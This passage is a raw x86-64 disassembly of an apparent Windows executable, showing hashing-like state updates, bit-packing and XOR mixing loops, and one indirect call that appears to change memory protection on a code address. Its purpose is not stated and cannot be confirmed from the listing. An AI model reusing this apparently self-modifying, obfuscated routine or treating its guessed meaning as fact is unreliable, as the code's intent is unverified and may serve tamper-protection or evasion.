   140049adc:	mov    eax,DWORD PTR [rbp+0xd1c]
   140049ae2:	add    DWORD PTR [rbp+0x854],eax
   140049ae8:	mov    eax,DWORD PTR [rbp+0xd20]
   140049aee:	add    DWORD PTR [rbp+0x858],eax
   140049af4:	mov    BYTE PTR [rip+0x4ef91],0x0        # 0x140098a8c
   140049afb:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   140049b02:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   140049b09:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   140049b10:	xor    eax,eax
   140049b12:	cmp    rax,0x14
   140049b16:	je     0x140049b2e
   140049b18:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   140049b1f:	bswap  ecx
   140049b21:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   140049b28:	add    rax,0x4
   140049b2c:	jmp    0x140049b12
   140049b2e:	mov    r8,QWORD PTR [rbp+0x7e0]
   140049b35:	mov    eax,esi
   140049b37:	shr    eax,0x3
   140049b3a:	and    eax,0x1f
   140049b3d:	lea    rcx,[rax+rbp*1]
   140049b41:	add    rcx,0xd10
   140049b48:	xor    r9d,r9d
   140049b4b:	xor    edx,edx
   140049b4d:	xor    eax,eax
   140049b4f:	cmp    r9,0x10
   140049b53:	je     0x140049b6e
   140049b55:	shld   rax,rdx,0x8
   140049b5a:	mov    r10,rdx
   140049b5d:	shl    r10,0x8
   140049b61:	movzx  edx,BYTE PTR [rcx+r9*1]
   140049b66:	inc    r9
   140049b69:	or     rdx,r10
   140049b6c:	jmp    0x140049b4f
   140049b6e:	push   0xffffffffffffffff
   140049b70:	pop    r9
   140049b72:	mov    r10,r9
   140049b75:	mov    ecx,r8d
   140049b78:	shl    r10,cl
   140049b7b:	cmp    r8,0x40
   140049b7f:	not    r10
   140049b82:	cmovae r10,r9
   140049b86:	and    esi,0x7
   140049b89:	lea    ecx,[r8+rsi*1]
   140049b8d:	neg    cl
   140049b8f:	shrd   rdx,rax,cl
   140049b93:	shr    rax,cl
   140049b96:	test   cl,0x40
   140049b99:	cmove  rax,rdx
   140049b9d:	and    rax,r10
   140049ba0:	mov    rsi,QWORD PTR [rbp+0x820]
   140049ba7:	add    r8,0x7
   140049bab:	bswap  rax
   140049bae:	shr    r8,0x3
   140049bb2:	mov    QWORD PTR [rbp+0x1060],rax
   140049bb9:	mov    r9,rsi
   140049bbc:	imul   r9,r8
   140049bc0:	push   0x8
   140049bc2:	pop    rcx
   140049bc3:	sub    rcx,r8
   140049bc6:	dec    r8
   140049bc9:	lea    rax,[rbp+0x85c]
   140049bd0:	lea    r11,[rax+r9*1]
   140049bd4:	mov    rax,r9
   140049bd7:	xor    edx,edx
   140049bd9:	push   0x14
   140049bdb:	pop    r14
   140049bdd:	div    r14
   140049be0:	cmp    rcx,0x8
   140049be4:	je     0x140049c0a
   140049be6:	cmp    r8,0x7
   140049bea:	ja     0x140059d80
   140049bf0:	imul   rax,rax,0xffffffffffffffec
   140049bf4:	mov    al,BYTE PTR [r11+rax*1]
   140049bf8:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   140049bff:	inc    rcx
   140049c02:	inc    r11
   140049c05:	inc    r9
   140049c08:	jmp    0x140049bd4
   140049c0a:	mov    r11,QWORD PTR [rbp+0x1060]
   140049c11:	bswap  r11
   140049c14:	and    r11,r10
   140049c17:	inc    rsi
   140049c1a:	mov    QWORD PTR [rbp+0x820],rsi
   140049c21:	mov    r9,QWORD PTR [rbp+0x890]
   140049c28:	mov    rax,QWORD PTR [rbp+0x880]
   140049c2f:	mov    r8,QWORD PTR [rbp+0x888]
   140049c36:	mov    rdx,r9
   140049c39:	sub    rdx,r8
   140049c3c:	sub    rdx,rax
   140049c3f:	mov    rcx,QWORD PTR [rbp+0x7e0]
   140049c46:	cmp    rdx,rcx
   140049c49:	cmovae rdx,rcx
   140049c4d:	cmp    rdx,0x1
   140049c51:	adc    rdx,0x0
   140049c55:	mov    r10d,ecx
   140049c58:	sub    r10d,edx
   140049c5b:	and    r10b,0x3f
   140049c5f:	cmp    rcx,rdx
   140049c62:	movzx  ecx,r10b
   140049c66:	cmovbe ecx,r15d
   140049c6a:	shr    r11,cl
   140049c6d:	mov    r10,QWORD PTR [rbp+0x870]
   140049c74:	mov    rsi,QWORD PTR [rbp+0x878]
   140049c7b:	mov    ecx,edx
   140049c7d:	shld   rsi,r10,cl
   140049c81:	shl    r10,cl
   140049c84:	test   dl,0x40
   140049c87:	cmovne rsi,r10
   140049c8b:	mov    ecx,0x0
   140049c90:	cmove  rcx,r10
   140049c94:	or     rcx,r11
   140049c97:	mov    QWORD PTR [rbp+0x878],rsi
   140049c9e:	mov    QWORD PTR [rbp+0x870],rcx
   140049ca5:	add    rax,rdx
   140049ca8:	mov    QWORD PTR [rbp+0x880],rax
   140049caf:	jmp    0x140049761
   140049cb4:	add    rax,0xfffffffffffffff8
   140049cb8:	mov    QWORD PTR [rbp+0x880],rax
   140049cbf:	mov    r9,QWORD PTR [rbp+0x878]
   140049cc6:	mov    r10,r9
   140049cc9:	mov    ecx,eax
   140049ccb:	shr    r10,cl
   140049cce:	mov    r11,QWORD PTR [rbp+0x870]
   140049cd5:	mov    rdx,r11
   140049cd8:	shrd   rdx,r9,cl
   140049cdc:	push   0xffffffffffffffff
   140049cde:	pop    r14
   140049ce0:	mov    rsi,r14
   140049ce3:	shl    rsi,cl
   140049ce6:	test   al,0x40
   140049ce8:	cmovne rdx,r10
   140049cec:	mov    ecx,0x0
   140049cf1:	cmove  rcx,rsi
   140049cf5:	cmove  rsi,r14
   140049cf9:	not    rsi
   140049cfc:	not    rcx
   140049cff:	and    rcx,r11
   140049d02:	and    rsi,r9
   140049d05:	test   rax,rax
   140049d08:	cmove  rsi,rax
   140049d0c:	cmove  rcx,rax
   140049d10:	mov    QWORD PTR [rbp+0x870],rcx
   140049d17:	mov    QWORD PTR [rbp+0x878],rsi
   140049d1e:	add    r8,0x8
   140049d22:	mov    QWORD PTR [rbp+0x888],r8
   140049d29:	inc    QWORD PTR [rbp+0x1180]
   140049d30:	lea    rcx,[rbp+0x500]
   140049d37:	call   0x14003c141
   140049d3c:	jmp    0x140049728
   140049d41:	mov    rcx,QWORD PTR [rbp+0x500]
   140049d48:	mov    rdx,QWORD PTR [rbp+0x508]
   140049d4f:	call   0x14006f7f7
   140049d54:	lea    rcx,[rbp+0x500]
   140049d5b:	push   0x8
   140049d5d:	pop    rdx
   140049d5e:	call   0x14003c111
   140049d63:	xor    r14d,r14d
   140049d66:	xorps  xmm7,xmm7
   140049d69:	lea    r12,[rbp+0xd10]
   140049d70:	push   0x4
   140049d72:	pop    rdi
   140049d73:	mov    QWORD PTR [rbp+0x1180],0x0
   140049d7e:	cmp    QWORD PTR [rbp+0x1180],0x8
   140049d86:	je     0x14004a389
   140049d8c:	mov    r8,QWORD PTR [rbp+0x888]
   140049d93:	mov    r9,QWORD PTR [rbp+0x890]
   140049d9a:	lea    rax,[r8+0x8]
   140049d9e:	cmp    rax,r9
   140049da1:	jbe    0x140049daa
   140049da3:	xor    edx,edx
   140049da5:	jmp    0x14004a371
   140049daa:	mov    rax,QWORD PTR [rbp+0x880]
   140049db1:	cmp    rax,0x8
   140049db5:	jae    0x14004a2fc
   140049dbb:	mov    rcx,QWORD PTR [rbp+0x820]
   140049dc2:	cmp    rcx,QWORD PTR [rbp+0x828]
   140049dc9:	jae    0x140049e10
   140049dcb:	mov    rcx,QWORD PTR [rbp+0x7d8]
   140049dd2:	mov    rdx,QWORD PTR [rbp+0x818]
   140049dd9:	cmp    rdx,rcx
   140049ddc:	jae    0x140049e10
   140049dde:	mov    rax,QWORD PTR [rbp+0x1170]
   140049de5:	movzx  esi,BYTE PTR [rax+rdx*1]
   140049de9:	and    esi,0x7f
   140049dec:	lea    rax,[rdx+0x1]
   140049df0:	cmp    rax,rcx
   140049df3:	jae    0x140049e1e
   140049df5:	movzx  r8d,BYTE PTR [rbx+rdx*1+0x11]
   140049dfb:	test   r8b,r8b
   140049dfe:	jns    0x140049e18
   140049e00:	shl    rsi,0x7
   140049e04:	and    r8d,0x7f
   140049e08:	or     rsi,r8
   140049e0b:	mov    rdx,rax
   140049e0e:	jmp    0x140049dec
   140049e10:	xor    r11d,r11d
   140049e13:	jmp    0x14004a27e
   140049e18:	inc    rdx
   140049e1b:	mov    rcx,rdx
   140049e1e:	mov    QWORD PTR [rbp+0x818],rcx
   140049e25:	mov    rax,rsi
   140049e28:	shr    rax,0x8
   140049e2c:	mov    r15,rsi
   140049e2f:	shr    r15,0x28
   140049e33:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   140049e3a:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   140049e41:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   140049e48:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   140049e4f:	mov    DWORD PTR [rbp+0xd10],eax
   140049e55:	lea    rax,[rip+0x3e1fc]        # 0x140088058
   140049e5c:	mov    QWORD PTR [rsp+0x20],rax
   140049e61:	lea    rcx,[rbp+0xf80]
   140049e68:	mov    rdx,rdi
   140049e6b:	mov    r8,r12
   140049e6e:	mov    r9,rdi
   140049e71:	call   0x1400638fe
   140049e76:	mov    BYTE PTR [rbp+0xf84],r15b
   140049e7d:	mov    r15,QWORD PTR [rbp+0x7f0]
   140049e84:	cmp    QWORD PTR [rbp+0x838],r15
   140049e8b:	jbe    0x140049fb7
   140049e91:	mov    r9,QWORD PTR [rbp+0x7f8]
   140049e98:	cmp    r9,0x4
   140049e9c:	ja     0x140059d9c
   140049ea2:	mov    rcx,QWORD PTR [rbp+0x800]
   140049ea9:	cmp    rcx,0x5
   140049ead:	jae    0x140059dae
   140049eb3:	mov    r8,QWORD PTR [rbp+0x838]
   140049eba:	cmp    r8,r15
   140049ebd:	je     0x140059dbc
   140049ec3:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   140049eca:	mov    cl,BYTE PTR [rbp+0x808]
   140049ed0:	rol    eax,cl
   140049ed2:	sub    r8,r15
   140049ed5:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   140049edd:	xor    edx,edx
   140049edf:	div    r8
   140049ee2:	mov    r13,rdx
   140049ee5:	mov    rax,QWORD PTR [rbp+0x840]
   140049eec:	mov    QWORD PTR [rbp+0x1060],rax
   140049ef3:	cmp    r15,0x40
   140049ef7:	push   0x40
   140049ef9:	pop    rax
   140049efa:	cmovae r15,rax
   140049efe:	movaps XMMWORD PTR [rbp+0xd40],xmm7
   140049f05:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   140049f0c:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   140049f13:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   140049f1a:	mov    rcx,r12
   140049f1d:	mov    rdx,r15
   140049f20:	call   0x14003c0b8
   140049f25:	mov    r10,QWORD PTR [rbp+0x838]
   140049f2c:	test   r10,r10
   140049f2f:	je     0x140049f7d
   140049f31:	mov    rcx,rax
   140049f34:	mov    r8,rdx
   140049f37:	mov    rax,rdx
   140049f3a:	add    rax,r13
   140049f3d:	mov    r9,QWORD PTR [rbp+0x830]
   140049f44:	cmp    rax,r10
   140049f47:	jbe    0x140049f67
   140049f49:	xor    r11d,r11d
   140049f4c:	cmp    r8,r11
   140049f4f:	je     0x140049f7d
   140049f51:	lea    rax,[r11+r13*1]
   140049f55:	xor    edx,edx
   140049f57:	div    r10
   140049f5a:	mov    al,BYTE PTR [r9+rdx*1]
   140049f5e:	mov    BYTE PTR [rcx+r11*1],al
   140049f62:	inc    r11
   140049f65:	jmp    0x140049f4c
   140049f67:	add    r9,r13
   140049f6a:	xor    eax,eax
   140049f6c:	cmp    r8,rax
   140049f6f:	je     0x140049f7d
   140049f71:	mov    dl,BYTE PTR [r9+rax*1]
   140049f75:	mov    BYTE PTR [rcx+rax*1],dl
   140049f78:	inc    rax
   140049f7b:	jmp    0x140049f6c
   140049f7d:	mov    rcx,QWORD PTR [rbp+0x7e8]
   140049f84:	xor    eax,eax
   140049f86:	cmp    r15,rax
   140049f89:	je     0x140049fb7
   140049f8b:	cmp    rcx,0x3f
   140049f8f:	ja     0x140059d8e
   140049f95:	mov    edx,eax
   140049f97:	and    edx,0x7
   140049f9a:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   140049fa1:	xor    dl,BYTE PTR [rbp+rax*1+0xd10]
   140049fa8:	inc    rax
   140049fab:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   140049fb2:	inc    rcx
   140049fb5:	jmp    0x140049f86
   140049fb7:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   140049fbe:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   140049fc5:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   140049fcc:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   140049fd3:	xor    eax,eax
   140049fd5:	cmp    rax,0x40
   140049fd9:	je     0x140049ff1
   140049fdb:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   140049fe2:	bswap  ecx
   140049fe4:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   140049feb:	add    rax,0x4
   140049fef:	jmp    0x140049fd5
   140049ff1:	movups xmm0,XMMWORD PTR [rbp+0x848]
   140049ff8:	mov    eax,DWORD PTR [rbp+0x858]
   140049ffe:	movups XMMWORD PTR [rbp+0xd10],xmm0
   14004a005:	mov    DWORD PTR [rbp+0xd20],eax
   14004a00b:	and    DWORD PTR [rbp+0xd24],0x0
   14004a012:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   14004a019:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   14004a020:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   14004a027:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   14004a02e:	lea    rax,[rbp+0xd28]
   14004a035:	movups XMMWORD PTR [rax+0x30],xmm3
   14004a039:	movups XMMWORD PTR [rax+0x20],xmm2
   14004a03d:	movups XMMWORD PTR [rax+0x10],xmm1
   14004a041:	movups XMMWORD PTR [rax],xmm0
   14004a044:	call   0x140064214
   14004a049:	mov    al,BYTE PTR [rip+0x4ea3e]        # 0x140098a8d
   14004a04f:	cmp    al,0x1
   14004a051:	je     0x14004a09a
   14004a053:	movzx  eax,al
   14004a056:	cmp    eax,0x2
   14004a059:	je     0x14004a13c
   14004a05f:	and    DWORD PTR [rbp+0x400],0x0
   14004a066:	lea    rcx,[rip+0xfffffffffffb7013]        # 0x140001080
   14004a06d:	mov    rdx,QWORD PTR [rbp+0x1150]
   14004a074:	push   0x40
   14004a076:	pop    r8
   14004a078:	lea    r9,[rbp+0x400]
   14004a07f:	call   QWORD PTR [rip+0x4a783]        # 0x140094808
   14004a085:	test   eax,eax
   14004a087:	sete   cl
   14004a08a:	inc    cl
   14004a08c:	mov    BYTE PTR [rip+0x4e9fb],cl        # 0x140098a8d
   14004a092:	test   eax,eax
   14004a094:	je     0x14004a13c
   14004a09a:	mov    al,BYTE PTR [rip+0x4eb18]        # 0x140098bb8
   14004a0a0:	cmp    al,0x1
   14004a0a2:	je     0x14004a0c7
   14004a0a4:	movzx  eax,al
   14004a0a7:	test   eax,eax
   14004a0a9:	jne    0x14004a13c
   14004a0af:	call   0x140065d51
   14004a0b4:	test   rax,rax
   14004a0b7:	sete   cl
   14004a0ba:	inc    cl
   14004a0bc:	mov    BYTE PTR [rip+0x4eaf6],cl        # 0x140098bb8
   14004a0c2:	test   rax,rax
   14004a0c5:	je     0x14004a13c
   14004a0c7:	call   0x140064227
   14004a0cc:	mov    eax,0xc8c291de
   14004a0d1:	xchg   DWORD PTR [rip+0x4ea09],eax        # 0x140098ae0
   14004a0d7:	call   QWORD PTR [rip+0x4a573]        # 0x140094650
   14004a0dd:	mov    eax,eax
   14004a0df:	mov    QWORD PTR [rip+0x4df1a],rax        # 0x140098000
   14004a0e6:	mov    rcx,r12
   14004a0e9:	push   0xffffffffffffffff
   14004a0eb:	pop    rdx
   14004a0ec:	call   0x14002b840
   14004a0f1:	xor    eax,eax
   14004a0f3:	xchg   DWORD PTR [rip+0x4e9e7],eax        # 0x140098ae0
   14004a0f9:	mov    BYTE PTR [rip+0x4e98e],0x0        # 0x140098a8e
   14004a100:	mov    eax,DWORD PTR [rbp+0xd10]
   14004a106:	add    DWORD PTR [rbp+0x848],eax
   14004a10c:	mov    eax,DWORD PTR [rbp+0xd14]
   14004a112:	add    DWORD PTR [rbp+0x84c],eax
   14004a118:	mov    eax,DWORD PTR [rbp+0xd18]
   14004a11e:	add    DWORD PTR [rbp+0x850],eax
   14004a124:	mov    eax,DWORD PTR [rbp+0xd1c]
   14004a12a:	add    DWORD PTR [rbp+0x854],eax
   14004a130:	mov    eax,DWORD PTR [rbp+0xd20]
   14004a136:	add    DWORD PTR [rbp+0x858],eax
   14004a13c:	mov    BYTE PTR [rip+0x4e949],0x0        # 0x140098a8c
   14004a143:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   14004a14a:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   14004a151:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   14004a158:	xor    eax,eax
   14004a15a:	cmp    rax,0x14
   14004a15e:	je     0x14004a176
   14004a160:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   14004a167:	bswap  ecx
   14004a169:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   14004a170:	add    rax,0x4
   14004a174:	jmp    0x14004a15a
   14004a176:	mov    r8,QWORD PTR [rbp+0x7e0]
   14004a17d:	mov    eax,esi
   14004a17f:	shr    eax,0x3
   14004a182:	and    eax,0x1f
   14004a185:	lea    rcx,[rax+rbp*1]
   14004a189:	add    rcx,0xd10
   14004a190:	xor    r9d,r9d
   14004a193:	xor    edx,edx
   14004a195:	xor    eax,eax
   14004a197:	cmp    r9,0x10
   14004a19b:	je     0x14004a1b6
   14004a19d:	shld   rax,rdx,0x8
   14004a1a2:	mov    r10,rdx
   14004a1a5:	shl    r10,0x8
   14004a1a9:	movzx  edx,BYTE PTR [rcx+r9*1]
   14004a1ae:	inc    r9
   14004a1b1:	or     rdx,r10
   14004a1b4:	jmp    0x14004a197
   14004a1b6:	push   0xffffffffffffffff
   14004a1b8:	pop    r9
   14004a1ba:	mov    r10,r9
   14004a1bd:	mov    ecx,r8d
   14004a1c0:	shl    r10,cl
   14004a1c3:	cmp    r8,0x40
   14004a1c7:	not    r10
   14004a1ca:	cmovae r10,r9
   14004a1ce:	and    esi,0x7
   14004a1d1:	lea    ecx,[r8+rsi*1]
   14004a1d5:	neg    cl
   14004a1d7:	shrd   rdx,rax,cl
   14004a1db:	shr    rax,cl
   14004a1de:	test   cl,0x40
   14004a1e1:	cmove  rax,rdx
   14004a1e5:	and    rax,r10
   14004a1e8:	mov    rsi,QWORD PTR [rbp+0x820]
   14004a1ef:	add    r8,0x7
   14004a1f3:	bswap  rax
   14004a1f6:	shr    r8,0x3
   14004a1fa:	mov    QWORD PTR [rbp+0x1060],rax
   14004a201:	mov    r9,rsi
   14004a204:	imul   r9,r8
   14004a208:	push   0x8
   14004a20a:	pop    rcx
   14004a20b:	sub    rcx,r8
   14004a20e:	dec    r8
   14004a211:	lea    rax,[rbp+0x85c]
   14004a218:	lea    r11,[rax+r9*1]
   14004a21c:	mov    rax,r9
   14004a21f:	xor    edx,edx
   14004a221:	push   0x14
   14004a223:	pop    r15
   14004a225:	div    r15
   14004a228:	cmp    rcx,0x8
   14004a22c:	je     0x14004a252
   14004a22e:	cmp    r8,0x7
   14004a232:	ja     0x140059d80
   14004a238:	imul   rax,rax,0xffffffffffffffec
   14004a23c:	mov    al,BYTE PTR [r11+rax*1]
   14004a240:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   14004a247:	inc    rcx
   14004a24a:	inc    r11
   14004a24d:	inc    r9
   14004a250:	jmp    0x14004a21c
   14004a252:	mov    r11,QWORD PTR [rbp+0x1060]
   14004a259:	bswap  r11
   14004a25c:	and    r11,r10
   14004a25f:	inc    rsi
   14004a262:	mov    QWORD PTR [rbp+0x820],rsi
   14004a269:	mov    r9,QWORD PTR [rbp+0x890]
   14004a270:	mov    rax,QWORD PTR [rbp+0x880]
   14004a277:	mov    r8,QWORD PTR [rbp+0x888]
   14004a27e:	mov    rdx,r9
   14004a281:	sub    rdx,r8
   14004a284:	sub    rdx,rax
   14004a287:	mov    rcx,QWORD PTR [rbp+0x7e0]
   14004a28e:	cmp    rdx,rcx
   14004a291:	cmovae rdx,rcx
   14004a295:	cmp    rdx,0x1
   14004a299:	adc    rdx,0x0
   14004a29d:	mov    r10d,ecx
   14004a2a0:	sub    r10d,edx
   14004a2a3:	and    r10b,0x3f
   14004a2a7:	cmp    rcx,rdx
   14004a2aa:	movzx  ecx,r10b
   14004a2ae:	cmovbe ecx,r14d
   14004a2b2:	shr    r11,cl
   14004a2b5:	mov    r10,QWORD PTR [rbp+0x870]
   14004a2bc:	mov    rsi,QWORD PTR [rbp+0x878]
   14004a2c3:	mov    ecx,edx
   14004a2c5:	shld   rsi,r10,cl
   14004a2c9:	shl    r10,cl
   14004a2cc:	test   dl,0x40
   14004a2cf:	cmovne rsi,r10
   14004a2d3:	mov    ecx,0x0
   14004a2d8:	cmove  rcx,r10
   14004a2dc:	or     rcx,r11
   14004a2df:	mov    QWORD PTR [rbp+0x878],rsi
   14004a2e6:	mov    QWORD PTR [rbp+0x870],rcx
   14004a2ed:	add    rax,rdx
   14004a2f0:	mov    QWORD PTR [rbp+0x880],rax
   14004a2f7:	jmp    0x140049db1
   14004a2fc:	add    rax,0xfffffffffffffff8
   14004a300:	mov    QWORD PTR [rbp+0x880],rax
   14004a307:	mov    r9,QWORD PTR [rbp+0x878]
   14004a30e:	mov    r10,r9
   14004a311:	mov    ecx,eax
   14004a313:	shr    r10,cl
   14004a316:	mov    r11,QWORD PTR [rbp+0x870]
   14004a31d:	mov    rdx,r11
   14004a320:	shrd   rdx,r9,cl
   14004a324:	push   0xffffffffffffffff
   14004a326:	pop    r15
   14004a328:	mov    rsi,r15
   14004a32b:	shl    rsi,cl
   14004a32e:	test   al,0x40
   14004a330:	cmovne rdx,r10
   14004a334:	mov    ecx,0x0
   14004a339:	cmove  rcx,rsi
   14004a33d:	cmove  rsi,r15
   14004a341:	not    rsi
   14004a344:	not    rcx
   14004a347:	and    rcx,r11
   14004a34a:	and    rsi,r9
   14004a34d:	test   rax,rax
   14004a350:	cmove  rsi,rax
   14004a354:	cmove  rcx,rax
   14004a358:	mov    QWORD PTR [rbp+0x870],rcx
   14004a35f:	mov    QWORD PTR [rbp+0x878],rsi
   14004a366:	add    r8,0x8
   14004a36a:	mov    QWORD PTR [rbp+0x888],r8
   14004a371:	inc    QWORD PTR [rbp+0x1180]
   14004a378:	lea    rcx,[rbp+0x500]
   14004a37f:	call   0x14003c141
   14004a384:	jmp    0x140049d7e
   14004a389:	mov    rbx,QWORD PTR [rbp+0x500]
   14004a390:	mov    r14,QWORD PTR [rbp+0x508]
   14004a397:	mov    rdi,QWORD PTR [rbp+0x510]
   14004a39e:	add    rdi,r14
   14004a3a1:	lea    rsi,[rbp+0xd10]
   14004a3a8:	mov    QWORD PTR [rsi],r14
   14004a3ab:	mov    QWORD PTR [rsi+0x8],rdi
   14004a3af:	mov    QWORD PTR [rsi+0x10],0x8
   14004a3b7:	and    QWORD PTR [rsi+0x18],0x0
   14004a3bc:	xor    r15d,r15d
   14004a3bf:	mov    rcx,rsi
   14004a3c2:	call   0x14003ba96
   14004a3c7:	test   rdx,rdx
   14004a3ca:	je     0x14004a3dc
   14004a3cc:	movzx  edx,BYTE PTR [rdx]
   14004a3cf:	shl    eax,0x3
   14004a3d2:	mov    ecx,eax
   14004a3d4:	shl    rdx,cl
   14004a3d7:	or     r15,rdx
   14004a3da:	jmp    0x14004a3bf
   14004a3dc:	mov    rax,QWORD PTR [rbp+0x5e0]
   14004a3e3:	xor    rax,r15
   14004a3e6:	movabs rcx,0x4f1bbcdca8279931
   14004a3f0:	imul   r15,rcx
   14004a3f4:	rol    r15,0x11
   14004a3f8:	xor    r15,rax
   14004a3fb:	xorps  xmm0,xmm0
   14004a3fe:	movaps XMMWORD PTR [rbp+0xd10],xmm0
   14004a405:	movaps XMMWORD PTR [rbp+0xd20],xmm0
   14004a40c:	movaps XMMWORD PTR [rbp+0xd30],xmm0
   14004a413:	movaps XMMWORD PTR [rbp+0xd40],xmm0
   14004a41a:	movaps XMMWORD PTR [rbp+0xd50],xmm0
   14004a421:	movaps XMMWORD PTR [rbp+0xd60],xmm0
   14004a428:	movaps XMMWORD PTR [rbp+0xd70],xmm0
   14004a42f:	movaps XMMWORD PTR [rbp+0xd80],xmm0
   14004a436:	movabs rax,0x748e804be25a7077
   14004a440:	mov    r9,r15
   14004a443:	xor    r9,rax
   14004a446:	mov    r10,r15
   14004a449:	or     r10,0x1
   14004a44d:	rol    r10,0x15
   14004a451:	mov    r12,QWORD PTR [rbp+0x1140]
   14004a458:	shr    r12,0x4
   14004a45c:	inc    r12
   14004a45f:	mov    r13,r12
   14004a462:	xor    r11d,r11d
   14004a465:	push   0x7
   14004a467:	pop    rsi
   14004a468:	cmp    r11,QWORD PTR [rbp+0xf78]
   14004a46f:	je     0x14004a548
   14004a475:	mov    rax,r11
   14004a478:	movabs rcx,0x32a27dbe0b6bcf37
   14004a482:	imul   rax,rcx
   14004a486:	rol    rax,0x20
   14004a48a:	xor    rax,r15
   14004a48d:	mov    rcx,r10
   14004a490:	mov    edx,esi
   14004a492:	mov    r8,r9
   14004a495:	sub    edx,0x1
   14004a498:	jb     0x14004a4ce
   14004a49a:	mov    r12,rcx
   14004a49d:	xor    r12,rax
   14004a4a0:	add    r12,r8
   14004a4a3:	rol    r12,0x28
   14004a4a7:	add    rax,r12
   14004a4aa:	rol    rax,0xf
   14004a4ae:	mov    r8,rax
   14004a4b1:	shr    r8,0x1d
   14004a4b5:	xor    rax,r8
   14004a4b8:	movabs r8,0x79ca1cd2f36bd757
   14004a4c2:	imul   r12,r8
   14004a4c6:	add    rcx,r10
   14004a4c9:	mov    r8,r12
   14004a4cc:	jmp    0x14004a495
   14004a4ce:	cmp    r11,0x10
   14004a4d2:	je     0x14005a187
   14004a4d8:	lea    rcx,[r11*4+0x3]
   14004a4e0:	xor    r12d,r12d
   14004a4e3:	cmp    rcx,QWORD PTR [rbp+0x1178]
   14004a4ea:	jae    0x14004a4ff
   14004a4ec:	lea    rcx,[r11*4+0x0]
   14004a4f4:	mov    rdx,QWORD PTR [rbp+0x1158]
   14004a4fb:	mov    r12d,DWORD PTR [rdx+rcx*1]
   14004a4ff:	xor    r8,rax
   14004a502:	mov    rax,r8
   14004a505:	shr    rax,0x18
   14004a509:	xor    edx,edx
   14004a50b:	push   0x1f
   14004a50d:	pop    rcx
   14004a50e:	div    ecx
   14004a510:	lea    ecx,[rdx+0x1]
   14004a513:	ror    r12d,cl
   14004a516:	mov    rax,r8
   14004a519:	shr    rax,0x10
   14004a51d:	mov    rcx,r8
   14004a520:	shr    rcx,0x28
   14004a524:	xor    ecx,eax
   14004a526:	xor    r8d,ecx
   14004a529:	xor    r8d,r12d
   14004a52c:	mov    rax,r8
   14004a52f:	xor    edx,edx
   14004a531:	div    r13
   14004a534:	shl    rdx,0x4
   14004a538:	mov    QWORD PTR [rbp+r11*8+0xd10],rdx
   14004a540:	inc    r11
   14004a543:	jmp    0x14004a468
   14004a548:	lea    rax,[rbp+0x1060]
   14004a54f:	mov    QWORD PTR [rax],r14
   14004a552:	mov    QWORD PTR [rax+0x8],rdi
   14004a556:	mov    QWORD PTR [rax+0x10],0x8
   14004a55e:	and    QWORD PTR [rax+0x18],0x0
   14004a563:	lea    rcx,[rbp+0x1060]
   14004a56a:	call   0x14003ba96
   14004a56f:	test   rdx,rdx
   14004a572:	je     0x14004a58c
   14004a574:	cmp    rax,0x8
   14004a578:	jb     0x14004a563
   14004a57a:	lea    r8,[rip+0x3db77]        # 0x1400880f8
   14004a581:	push   0x8
   14004a583:	pop    rdx
   14004a584:	mov    rcx,rax
   14004a587:	jmp    0x14004814d
   14004a58c:	lea    rdi,[rbp-0x48]
   14004a590:	lea    rsi,[rbp+0xd10]
   14004a597:	mov    ecx,0x80
   14004a59c:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   14004a59e:	mov    rcx,rbx
   14004a5a1:	mov    rdx,r14
   14004a5a4:	call   0x14006f7f7
   14004a5a9:	mov    rcx,QWORD PTR [rbp+0x1160]
   14004a5b0:	mov    rdx,QWORD PTR [rbp+0x1158]
   14004a5b7:	call   0x14006f7f7
   14004a5bc:	mov    r12,QWORD PTR [rbp+0x1148]
   14004a5c3:	mov    r15,r12
   14004a5c6:	mov    rax,QWORD PTR [rbp+0x4d0]
   14004a5cd:	add    r15,rax
   14004a5d0:	lea    rsi,[rbp+0x7e0]
   14004a5d7:	mov    QWORD PTR [rsi-0x10],r12
   14004a5db:	mov    QWORD PTR [rsi-0x8],rax
   14004a5df:	mov    QWORD PTR [rsi],r12
   14004a5e2:	mov    QWORD PTR [rsi+0x8],r15
   14004a5e6:	and    QWORD PTR [rsi+0x10],0x0
   14004a5eb:	movabs r14,0x100003600
   14004a5f5:	mov    rcx,rsi
   14004a5f8:	call   0x14003bd7e
   14004a5fd:	cmp    eax,0x1
   14004a600:	jne    0x14004a642
   14004a602:	mov    rdi,QWORD PTR [rbp+0x7f0]
   14004a609:	mov    rcx,QWORD PTR [rbp+0x7e0]
   14004a610:	mov    rax,QWORD PTR [rbp+0x7e8]
   14004a617:	add    r15,rdi
   14004a61a:	add    r12,rax
   14004a61d:	sub    r15,r12
   14004a620:	mov    rbx,r15
   14004a623:	add    rbx,rcx
